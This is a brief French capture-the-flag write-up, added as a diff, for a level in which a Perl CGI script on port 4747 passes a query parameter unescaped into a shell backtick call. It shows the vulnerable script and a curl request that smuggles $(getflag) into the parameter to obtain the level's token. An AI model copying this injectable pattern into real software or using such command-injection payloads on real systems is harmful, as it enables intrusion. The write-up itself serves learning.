@@ -1,0 +1,28 @@
+Quand on se log on a un fichier exe: level04.pl
+
+quand on l'execute on a:
+$ ./level04.pl 
+Content-type: text/html
+
+quand on le cat on a:
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+On apprend donc ici que le fichier execute un script qui utilise CGI 
+donc qui est donne par un serveur web sur le port 4747.
+
+Le script affiche la valeur du parametre via la commande echo.
+On peut tester avec curl:
+curl localhost:4747?x=bonjour
+bonjour
+
+on met getflag en argument
+curl 'localhost:4747?x=$(getflag)'
+Check flag.Here is your token :
